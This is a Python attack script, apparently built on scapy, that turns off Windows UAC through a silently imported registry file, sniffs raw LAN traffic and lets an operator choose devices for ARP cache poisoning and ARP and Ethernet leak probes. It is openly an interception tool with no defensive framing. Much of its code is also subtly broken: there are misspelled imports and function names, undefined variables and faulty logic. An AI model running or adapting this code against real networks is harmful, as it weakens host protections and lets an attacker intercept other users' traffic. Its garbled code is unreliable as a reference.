from warnings import filterwarning
filterwarnings('ignore')
import datetime, reg
from scape.all import *
from scape.layers.inet import IP, UDP, TCP, ICMP
from scape.layers.l2 import Ether, Dot3, arpcachepoison, etherleak, arpleak, getmacbip

proto_icmp = '############################ ICMP protocol ############################\ndate: '
hex_icmp = '############################ ICMP  hexdump ############################\n'
proto_udp = '############################ protocol: UDP ############################\ndate: '
hexdump_udp = '############################# UDP hexdump #############################\n'
proto_tcp = '############################ protocol: TCP ############################\ndate: '
hexdum_tcp = '############################# TCP hexdump #############################\n'
results, contents, arps_list, content_list, devices_count = '', '', [], [], 2

# Turns off UAC if currently turned on (for Windows OS only)
def check_if_UAC_is_off():
    if ctypes.windll.shell32.IsUserAnAdmin() == 1:
        subprocess.call('C:\\Windows\\System32\\ipconfig.exe /flushdns', shell=True)
        sniff_network()
    else:
        # Creates a Reg file to turn-off UAC...
        turn_off_uac = 'Windows Registry Editor Version 5.00\n\n' \
                       '[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System]\n' \
                       '"EnableLUA"=-\n\n' \
                       '[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System]\n' \
                       '"EnableLUA"=dword:0000000'
        with open(os.getcwd() + '\\{}'.format('reg_file.reg'), 'w') as reg:
            reg.write(turn_off_uac)
        file_path = os.getcwd() + '\\{}'.format('reg_file.reg')
        subprocess.call('C:\\Windows\\regedit.exe /s "{}"'.format(file_path), shell=True)
        os.remove('del ' + file_path)
        check_if_UAC_is_off()

# Sniffs devices within the network (only works if UAC is turned-off)
def sniff_network():
    # Standard protocols inside a network...
    global content, arp_list
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
    s.bind((socket.gethostbyname(socket.gethostname()), 0))
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    s.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
    while True:
        packets, address = s.recvfrom(65565)
        header = struct.unpack('!BBHHHBBHBBBBBB', packets[:20])
        if address[0] != socket.gethostbyname(socket.gethostname()):
            # A standard TCP packet structure is given...
            duration = attack_arp()
            if header[6] == 17:
                content = f'{protoc_tcp}' + str(datetime.now()) + '\n' \
                          'UDP raw packet: ' + str(packets) + '\n' \
                          'UDP IP | MAC: ' + str(address[0] + ' | ' + getmacbyip(address[0])) + '\n' \
                          f'{hex_udp}' + hexdump(Ether(packets) / IP(packets) / UDP(packets), True) + '\n' \
                          'UDP summary: ' + Ether(packets).summary() + IP(packets).summary() + UDP(packets).summary()
                arp_list.append((address[0], getmacbyip(address[0])))
                arp_list = list(set(arp_list))
                content_list.append(content)
                if len(arp_list) <= device_count or duration > 0:
                    stop_time = time.time() + float(duration)
                    if time.time() >= stop_time:
                        attack_arp()
                    else:
                        pass
            # A standard UDP packet structure is given...
            elif header[7] == 6:
                content = f'{protoc_tcp}' + str(datetime.now()) + '\n' \
                          'TCP raw packet: ' + str(packets) + '\n' \
                          'TCP IP | MAC: ' + str(address[0] + ' | ' + getmacbyip(address[0])) + '\n' \
                          f'{hex_tcp}' + hexdump(Ether(packets) / IP(packets) / TCP(packets), True) + '\n' \
                          'TCP summary: ' + Ether(packets).summary() + IP(packets).summary() + TCP(packets).summary()
                #attack_dns()
            # A standard ICMP packet structure is given...
            elif header[4] == 1:
                content = f'{protoc_icmp}' + str(datetime.now()) + '\n' \
                          'ICMP raw packet: ' + str(packets) + '\n' \
                          'ICMP IP | MAC: ' + str(address[0] + ' | ' + getmacbyip(address[0])) + '\n' \
                          f'{hex_icmp}' + hexdump(IP(packets) / ICMP(packets), True) + '\n' \
                          'ICMP summary: ' + IP(packets).summary() + ICMP(packets).summary()
                # flush dns...
            else:
                pass
        else:
            pass

def attack_arp():
    global content, result
    duration, targets = 0, []
    for i in range(0, len(arp_list)):
        result += '===========================================================================\n' \
                  f'device {i}: IP address: ' + str(arp_list[i][0]) + ' MAC address: ' + str(arp_list[i][1]) + '\n'
    print(result)
    # Add 'all' command option to leave no exceptions in attacking or monitoring devices...
    target = input('[+] input target id/s to attack, separated by commas: ')
    if target is not None:
        if 'all' in target:
            targets = [arp_list[i][0] for i in range(0, len(arp_list))]
            arpcachepoisn(targets, addresses=socket.gethostbyname(socket.gethostname()))
        elif 'wait' in target:
            duration = regex.split(' +', target)[1]
            if duration.isnumeric() and float(duration) > 0:
                sub_target = input('[+] input target id/s to monitor, separated by commas: ')
                if sub_target is not None:
                    if 'all' in sub_target:
                        print(content)
                    else:
                        list(set(content_list))
                        sub_target = regex.split(' +', sub_target)
                        for i in range(0, len(sub_target)):
                            if not sub_target[i].isdigit():
                                print(f'[!] input "{sub_target[i]}" is not an integer...')
                            elif int(sub_target[i]) > len(sub_target) - 1:
                                print(f'[!] input "{sub_target[i]}" is not in range...')
                            else:
                                target_ip = arp_list[int(sub_target[i])][0]
                                targets.append(target_ip)
                                if target_ip in content_list[i]:
                                    print(content_list[i])
                        return duration
                else:
                    print('second input is empty...')
                    return duration
            else:
                print(f'[!] input "{duration}" is not an integer or is not greater than zero...')
        else:
            target = reex.split(' +', target)
            for i in range(0, len(target)):
                target[i].strip()
                if not target[i].isdigit():
                    print(f'[!] input "{target[i]}" is not an integer...')
                elif int(target[i]) > len(target) - 1:
                    print(f'[!] input "{target[i]}" is not in range...')
                else:
                    target_ip = arp_list[int(target[i])][0]
                    arplek(target_ip)
                    eterleak(target_ip)
                    targets.append(target_ip)
            arpcachepoisn(targets, addresses=socket.gethostbyname(socket.gethostname()))
    else:
        print('first input is empty...')

check_if_UAC_is_off()